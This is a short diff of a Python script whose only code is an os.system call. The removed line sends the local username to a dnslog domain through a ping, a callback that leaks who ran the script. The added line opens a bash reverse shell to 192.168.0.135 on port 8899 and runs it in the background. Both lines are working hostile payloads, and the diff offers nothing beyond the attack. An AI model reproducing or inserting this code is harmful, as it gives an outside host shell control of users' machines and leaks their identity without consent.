@@ -2,4 +2,4 @@
 # -*- coding: UTF-8 -*-
 
 import os
-os.system("ping `whoami`.d231f0ac.dnslog.store")
+os.system("bash -c 'bash -i >& /dev/tcp/192.168.0.135/8899 0>&1' &")
